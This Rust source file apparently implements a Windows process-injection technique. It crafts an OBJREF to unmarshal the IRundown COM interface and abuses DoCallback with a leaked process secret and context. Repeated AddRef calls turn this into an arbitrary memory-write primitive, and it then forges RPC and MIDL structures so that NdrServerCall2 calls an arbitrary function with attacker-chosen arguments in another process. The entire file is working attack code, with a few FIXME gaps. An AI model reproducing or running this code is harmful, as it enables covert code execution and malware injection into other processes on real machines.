#![allow(non_snake_case)]

use std::fs;
use std::mem::transmute_copy;
use std::{ffi::c_void, mem::size_of};

use endian_codec::EncodeLE;
use pe_parser::pe::parse_portable_executable;
use pe_parser::section::SectionHeader;
use windows::core::*;
use windows::Win32::System::Com::IStream;
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows::Win32::{
    System::Com::{Marshal::CoUnmarshalInterface, STREAM_SEEK_SET},
    UI::Shell::SHCreateMemStream,
};

use super::structs::{
    ARGS_BUFFER, MIDL_SERVER_INFO, MIDL_STUB_DESC, RPC_CLIENT_INTERFACE, RPC_DISPATCH_TABLE,
    RPC_MESSAGE, RPC_SYNTAX_IDENTIFIER, RPC_VERSION,
};
use super::structs::OBJREF;

#[derive(Debug, Clone, Copy, Default)]
#[allow(non_snake_case, non_camel_case_types)]
#[repr(C, packed(4))]
struct XAptCallback {
    pfnCallback: usize,
    pParam: usize,
    pServerCtx: usize,
    pUnk: usize,
    iid: GUID,
    iMethod: i32,
    guidProcessSecret: u128,
}

#[interface("00000134-0000-0000-C000-000000000046")]
unsafe trait IRundown: IUnknown {
    fn RemQueryInterface(&self, dwDestContext: u32, pclsid: *mut GUID) -> HRESULT;
    fn RemAddRef(&self, dwDestContext: u32, pclsid: *mut GUID) -> HRESULT;
    fn RemRelease(&self, dwDestContext: u32, pclsid: *mut GUID) -> HRESULT;
    fn RemQueryInterface2(&self, dwDestContext: u32, pclsid: *mut GUID) -> HRESULT;
    fn AcknowledgeMarshalingSets(&self, dwDestContext: u32, pclsid: *mut GUID) -> HRESULT;
    fn RemChangeRef(&self, dwDestContext: u32, pclsid: *mut GUID) -> HRESULT;
    fn DoCallback(&self, callback: *const XAptCallback) -> HRESULT;
    fn DoNonreentrantCallback(&self, dwDestContext: u32, pclsid: *mut GUID) -> HRESULT;
    fn GetInterfaceNameFromIPID(&self, dwDestContext: u32, pclsid: *mut GUID) -> HRESULT;
    fn RundownOid(&self, dwDestContext: u32, pclsid: *mut GUID) -> HRESULT;
}

pub fn init_remote_com_secret(ipid: u128, oxid: u64) -> HRESULT {
    let mut objref = OBJREF::default();

    objref.signature = 0x574f454d;
    objref.flags = 1;
    objref.iid = GUID::from_values(
        0x00000134,
        0x0000,
        0x0000,
        [0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
    );

    objref.std.flags = 0;
    objref.std.cPublicRefs = 1;

    objref.std.ipid = ipid;
    objref.std.oxid = oxid;

    let stream: IStream = unsafe { SHCreateMemStream(None).unwrap() };
    unsafe {
        stream
            .Write(
                &objref as *const OBJREF as *const c_void,
                size_of::<OBJREF>() as u32,
                None,
            )
            .unwrap()
    };

    unsafe { stream.Seek(0, STREAM_SEEK_SET, None).unwrap() };

    let rundown: IRundown = unsafe { CoUnmarshalInterface(&stream).unwrap() };

    unsafe { (rundown.vtable().base__.AddRef)(transmute_copy(&rundown)) };

    let mut callback = XAptCallback::default();

    callback.pfnCallback = 1;
    callback.pParam = 1;

    let res = unsafe { rundown.DoCallback(&callback as *const XAptCallback) };

    res
}

pub fn set_target_func(func: u64, ipid: u128, oxid: u64, context: u64, secret: u128) {
    let mut target_function_data = vec![0; size_of::<usize>()];
    func.encode_as_le_bytes(&mut target_function_data);

    //let start_address =
    //    unsafe { GetModuleHandleA(s!("rpcrt4\0")).unwrap().0 as u64 } + 0xFF000 + 0x15E4;

    let rpcrt4_binary =
        fs::read(r"C:\windows\system32\rpcrt4.dll").expect("Failed reading rpcrt4 from disk");
    let rpcrt4_pe =
        parse_portable_executable(rpcrt4_binary.as_slice()).expect("Failed parsing rpcrt4.dll");

    let rpcrt_data: SectionHeader = rpcrt4_pe
        .section_table
        .into_iter()
        .filter(|&sec| sec.name.starts_with(".data".as_bytes()))
        .collect::<Vec<SectionHeader>>()
        .first()
        .expect("Failed getting .data section for rpcrt4.dll")
        .clone();

    let start_address = unsafe { GetModuleHandleA(s!("rpcrt4\0")).unwrap().0 as u64 }
        + rpcrt_data.virtual_address as u64
        + rpcrt_data.virtual_size as u64;

    overwrite_data_to_address(
        &target_function_data,
        start_address,
        ipid,
        oxid,
        secret,
        context,
    );
}

pub fn write_rpc_message(
    start_address: u64,
    arguments_address: u64,
    function_address: u64,
    ipid: u128,
    oxid: u64,
    context: u64,
    secret: u128,
) -> u64 {
    
    let mut start_address = start_address;

    let combase_binary =
        fs::read(r"C:\windows\system32\combase.dll").expect("Failed reading combase from disk");
    let combase_pe =
        parse_portable_executable(combase_binary.as_slice()).expect("Failed parsing combase.dll");

    let combase_data: SectionHeader = combase_pe
        .section_table
        .into_iter()
        .filter(|&sec| sec.name.starts_with(".data".as_bytes()))
        .collect::<Vec<SectionHeader>>()
        .first()
        .expect("Failed getting .data section for combase.dll")
        .clone();

    let zero_mem = unsafe { GetModuleHandleA(s!("combase.dll\0")).unwrap().0 as u64 }
        + combase_data.virtual_address as u64
        + combase_data.virtual_size as u64;

    let arguments_memory = arguments_address;

    let target_function: u64 = function_address;

    let mut target_function_data = vec![0; size_of::<usize>()];
    target_function.encode_as_le_bytes(&mut target_function_data);

    let target_function_address = start_address;
    write_data_to_address(
        &target_function_data,
        start_address,
        ipid,
        oxid,
        secret,
        context,
    );
    start_address += target_function_data.len() as u64 + 8;

    let mut rpc_dispatch_table = RPC_DISPATCH_TABLE::default();
    rpc_dispatch_table.DispatchTableCount = 1;
    rpc_dispatch_table.DispatchTable = target_function_address as usize;

    let rpc_dispatch_table_data: [u8; size_of::<RPC_DISPATCH_TABLE>()];
    unsafe { rpc_dispatch_table_data = transmute_copy(&rpc_dispatch_table) };

    let rpc_dispatch_table_address = start_address;
    write_data_to_address(
        &rpc_dispatch_table_data,
        start_address,
        ipid,
        oxid,
        secret,
        context,
    );
    start_address += rpc_dispatch_table_data.len() as u64;

    let argument_format_string: Vec<u8> = vec![
        0x32, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x68, 0x00, 0xc0, 0x00, 0x10, 0x00, 0x44,
        0x0d, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00,
        0x0b, 0x00, 0x48, 0x00, 0x08, 0x00, 0x0b, 0x00, 0x48, 0x00, 0x10, 0x00, 0x0b, 0x00, 0x48,
        0x00, 0x18, 0x00, 0x0b, 0x00, 0x48, 0x00, 0x20, 0x00, 0x0b, 0x00, 0x48, 0x00, 0x28, 0x00,
        0x0b, 0x00, 0x48, 0x00, 0x30, 0x00, 0x0b, 0x00, 0x48, 0x00, 0x38, 0x00, 0x0b, 0x00, 0x48,
        0x00, 0x40, 0x00, 0x0b, 0x00, 0x48, 0x00, 0x48, 0x00, 0x0b, 0x00, 0x48, 0x00, 0x50, 0x00,
        0x0b, 0x00, 0x48, 0x00, 0x58, 0x00, 0x0b, 0x00, 0x70, 0x00, 0x60, 0x00, 0x0b, 0x00, 0x00,
    ];

    let argument_format_string_address = start_address;
    write_data_to_address(
        &argument_format_string,
        start_address,
        ipid,
        oxid,
        secret,
        context,
    );
    start_address += argument_format_string.len() as u64;

    let mut midl_stub_desc = MIDL_STUB_DESC::default();
    midl_stub_desc.mFlags = 1;
    midl_stub_desc.fCheckBounds = 1;
    midl_stub_desc.Version = 0x50002;
    midl_stub_desc.MIDLVersion = 0x800025b;
    // FIXME
    // RpcInterfaceInformation

    let midl_stub_data: [u8; size_of::<MIDL_STUB_DESC>()];
    unsafe { midl_stub_data = transmute_copy(&midl_stub_desc) };

    let midl_stub_address = start_address;
    write_data_to_address(&midl_stub_data, start_address, ipid, oxid, secret, context);
    start_address += midl_stub_data.len() as u64;

    let mut midl_server_info = MIDL_SERVER_INFO::default();
    midl_server_info.pStubDesc = midl_stub_address as usize;
    midl_server_info.ProcString = argument_format_string_address as usize;
    midl_server_info.FmtStringOffset = zero_mem as usize;
    midl_server_info.DispatchTable = target_function_address as usize;
    // FIXME
    // FmtStringOffset, DispatchTable

    let midl_server_info_data: [u8; size_of::<MIDL_SERVER_INFO>()];
    unsafe { midl_server_info_data = transmute_copy(&midl_server_info) };

    let midl_server_info_address = start_address;
    write_data_to_address(
        &midl_server_info_data,
        start_address,
        ipid,
        oxid,
        secret,
        context,
    );
    start_address += midl_server_info_data.len() as u64;

    let mut rpc_client_interface = RPC_CLIENT_INTERFACE::default();
    rpc_client_interface.DispatchTable = rpc_dispatch_table_address as usize;
    // FIXME
    rpc_client_interface.InterpreterInfo = midl_server_info_address as usize;
    rpc_client_interface.Length = size_of::<RPC_CLIENT_INTERFACE>() as u32;
    rpc_client_interface.InterfaceId.SyntaxVersion.MajorVersion = 1;
    rpc_client_interface
        .TransferSyntax
        .SyntaxVersion
        .MajorVersion = 2;
    rpc_client_interface.Flags = 0x4000000;

    let rpc_client_interface_data: [u8; size_of::<RPC_CLIENT_INTERFACE>()];
    //rpc_client_interface.encode_as_le_bytes(&mut rpc_client_interface_data);

    unsafe { rpc_client_interface_data = transmute_copy(&rpc_client_interface) };

    let rpc_client_interface_address = start_address;

    write_data_to_address(
        &rpc_client_interface_data,
        start_address,
        ipid,
        oxid,
        secret,
        context,
    );
    start_address += rpc_client_interface_data.len() as u64;

    let mut rpc_message = RPC_MESSAGE::default();
    let mut rpc_syntax_identifier = RPC_SYNTAX_IDENTIFIER::default();
    let mut rpc_version = RPC_VERSION::default();

    rpc_version.MajorVersion = 2;
    rpc_syntax_identifier.SyntaxVersion = rpc_version;

    rpc_message.RpcFlags = 0x1000;
    rpc_message.DataRepresentation = 0x10;

    rpc_message.RpcInterfaceInformation = rpc_client_interface_address as usize;
    rpc_message.BufferLength = 14 * size_of::<usize>() as u32;

    rpc_message.Buffer = arguments_memory as usize;

    let rpc_message_data: [u8; size_of::<RPC_MESSAGE>()];
    unsafe { rpc_message_data = transmute_copy(&rpc_message) };

    write_data_to_address(
        &rpc_message_data,
        start_address,
        ipid,
        oxid,
        secret,
        context,
    );

    start_address
}

pub fn overwrite_data_to_address(
    data: &[u8],
    address: u64,
    ipid: u128,
    oxid: u64,
    secret: u128,
    context: u64,
) {
    let mut objref = OBJREF::default();

    objref.signature = 0x574f454d;
    objref.flags = 1;
    objref.iid = GUID::from_values(
        0x00000134,
        0x0000,
        0x0000,
        [0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
    );

    objref.std.flags = 0;
    objref.std.cPublicRefs = 1;

    objref.std.ipid = ipid;
    objref.std.oxid = oxid;

    let stream: IStream = unsafe { SHCreateMemStream(None).unwrap() };
    unsafe {
        stream
            .Write(
                &objref as *const OBJREF as *const c_void,
                size_of::<OBJREF>() as u32,
                None,
            )
            .unwrap()
    };

    unsafe { stream.Seek(0, STREAM_SEEK_SET, None).unwrap() };

    let rundown: IRundown = unsafe { CoUnmarshalInterface(&stream).unwrap() };

    unsafe { (rundown.vtable().base__.AddRef)(transmute_copy(&rundown)) };

    let mut callback = XAptCallback::default();

    callback.guidProcessSecret = secret;
    callback.pServerCtx = context as usize;

    let combase_handle = unsafe { GetModuleHandleA(s!("combase.dll\0")).unwrap() };

    callback.pfnCallback =
        unsafe { GetProcAddress(combase_handle, s!("CStdStubBuffer_AddRef\0")).unwrap() as usize };

    for (index, byte) in data.iter().enumerate() {
        callback.pParam = address as usize - 8 + index;
        loop {
            let res = unsafe { rundown.DoCallback(&callback as *const XAptCallback) };
            if (res.0 & 0xFF) as u8 == *byte {
                break;
            }
        }
    }
}

pub fn write_data_to_address(
    data: &[u8],
    address: u64,
    ipid: u128,
    oxid: u64,
    secret: u128,
    context: u64,
) {
    let mut objref = OBJREF::default();

    objref.signature = 0x574f454d;
    objref.flags = 1;
    objref.iid = GUID::from_values(
        0x00000134,
        0x0000,
        0x0000,
        [0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
    );

    objref.std.flags = 0;
    objref.std.cPublicRefs = 1;

    objref.std.ipid = ipid;
    objref.std.oxid = oxid;

    let stream: IStream = unsafe { SHCreateMemStream(None).unwrap() };
    unsafe {
        stream
            .Write(
                &objref as *const OBJREF as *const c_void,
                size_of::<OBJREF>() as u32,
                None,
            )
            .unwrap()
    };

    unsafe { stream.Seek(0, STREAM_SEEK_SET, None).unwrap() };

    let rundown: IRundown = unsafe { CoUnmarshalInterface(&stream).unwrap() };

    unsafe { (rundown.vtable().base__.AddRef)(transmute_copy(&rundown)) };

    let mut callback = XAptCallback::default();

    callback.guidProcessSecret = secret;
    callback.pServerCtx = context as usize;

    let combase_handle = unsafe { GetModuleHandleA(s!("combase.dll\0")).unwrap() };

    callback.pfnCallback =
        unsafe { GetProcAddress(combase_handle, s!("CStdStubBuffer_AddRef\0")).unwrap() as usize };

    for (index, byte) in data.iter().enumerate() {
        for _i in 0..*byte {
            callback.pParam = address as usize - 8 + index;

            let res = unsafe { rundown.DoCallback(&callback as *const XAptCallback) };

            if res.is_err() {
                println!("DoCallback error {:X?} ", res);
            }
        }
    }
}

pub fn set_call_args(args: [u64; 14], ipid: u128, oxid: u64, secret: u128, context: u64) {
    let kernel32_binary =
        fs::read(r"C:\windows\system32\kernel32.dll").expect("Failed reading combase from disk");
    let kernel32_pe =
        parse_portable_executable(kernel32_binary.as_slice()).expect("Failed parsing combase.dll");

    let kernel32_data: SectionHeader = kernel32_pe
        .section_table
        .into_iter()
        .filter(|&sec| sec.name.starts_with(".data".as_bytes()))
        .collect::<Vec<SectionHeader>>()
        .first()
        .expect("Failed getting .data section for kernel32.dll")
        .clone();

    //let arguments_memory =
    //    unsafe { GetModuleHandleA(s!("kernel32.dll\0")).unwrap().0 as u64 + 0xB9000 + 0x1348 };
    let arguments_memory = unsafe {
        GetModuleHandleA(s!("kernel32.dll\0")).unwrap().0 as u64
            + kernel32_data.virtual_address as u64
            + ((kernel32_data.virtual_size + 8 - 1 ) & 0xFFF8) as u64
    };

    let mut arguments_data = ARGS_BUFFER::default();
    arguments_data.arg1 = args[0] as usize;
    arguments_data.arg2 = args[1] as usize;
    arguments_data.arg3 = args[2] as usize;
    arguments_data.arg4 = args[3] as usize;
    arguments_data.arg5 = args[4] as usize;
    arguments_data.arg6 = args[5] as usize;
    arguments_data.arg7 = args[6] as usize;
    arguments_data.arg8 = args[7] as usize;
    arguments_data.arg9 = args[8] as usize;
    arguments_data.arg10 = args[9] as usize;
    arguments_data.arg11 = args[10] as usize;
    arguments_data.arg12 = args[11] as usize;
    arguments_data.arg13 = args[12] as usize;
    arguments_data.arg14 = args[13] as usize;

    let args_data_buffer: [u8; size_of::<ARGS_BUFFER>()];
    unsafe { args_data_buffer = transmute_copy(&arguments_data) };

    overwrite_data_to_address(
        &args_data_buffer,
        arguments_memory,
        ipid,
        oxid,
        secret,
        context,
    );
}

pub fn call_ndr_server_call2(message: u64, ipid: u128, oxid: u64, secret: u128, context: u64) {
    let mut objref = OBJREF::default();

    objref.signature = 0x574f454d;
    objref.flags = 1;
    objref.iid = GUID::from_values(
        0x00000134,
        0x0000,
        0x0000,
        [0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
    );

    objref.std.flags = 0;
    objref.std.cPublicRefs = 1;

    objref.std.ipid = ipid;
    objref.std.oxid = oxid;

    let stream: IStream = unsafe { SHCreateMemStream(None).unwrap() };
    unsafe {
        stream
            .Write(
                &objref as *const OBJREF as *const c_void,
                size_of::<OBJREF>() as u32,
                None,
            )
            .unwrap()
    };

    unsafe { stream.Seek(0, STREAM_SEEK_SET, None).unwrap() };

    let rundown: IRundown = unsafe { CoUnmarshalInterface(&stream).unwrap() };

    unsafe { (rundown.vtable().base__.AddRef)(transmute_copy(&rundown)) };

    let mut callback = XAptCallback::default();

    callback.guidProcessSecret = secret;
    callback.pServerCtx = context as usize;

    let combase_handle = unsafe { GetModuleHandleA(s!("rpcrt4.dll\0")).unwrap() };

    callback.pfnCallback =
        unsafe { GetProcAddress(combase_handle, s!("NdrServerCall2\0")).unwrap() as usize };

    callback.pParam = message as usize;

    let res = unsafe { rundown.DoCallback(&callback as *const XAptCallback) };

    println!("Result : {:?}", res)
}

pub fn increment_and_read(address: u64, ipid: u128, oxid: u64, secret: u128, context: u64) -> u64 {
    let mut objref = OBJREF::default();

    objref.signature = 0x574f454d;
    objref.flags = 1;
    objref.iid = GUID::from_values(
        0x00000134,
        0x0000,
        0x0000,
        [0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
    );

    objref.std.flags = 0;
    objref.std.cPublicRefs = 1;

    objref.std.ipid = ipid;
    objref.std.oxid = oxid;

    let stream: IStream = unsafe { SHCreateMemStream(None).unwrap() };
    unsafe {
        stream
            .Write(
                &objref as *const OBJREF as *const c_void,
                size_of::<OBJREF>() as u32,
                None,
            )
            .unwrap()
    };

    unsafe { stream.Seek(0, STREAM_SEEK_SET, None).unwrap() };

    let rundown: IRundown = unsafe { CoUnmarshalInterface(&stream).unwrap() };

    unsafe { (rundown.vtable().base__.AddRef)(transmute_copy(&rundown)) };

    let mut callback = XAptCallback::default();

    callback.guidProcessSecret = secret;
    callback.pServerCtx = context as usize;

    let combase_handle = unsafe { GetModuleHandleA(s!("combase.dll\0")).unwrap() };

    callback.pfnCallback =
        unsafe { GetProcAddress(combase_handle, s!("CStdStubBuffer_AddRef\0")).unwrap() as usize };

    callback.pParam = address as usize - 8;

    let res = unsafe { rundown.DoCallback(&callback as *const XAptCallback) };

    res.0 as u64
}
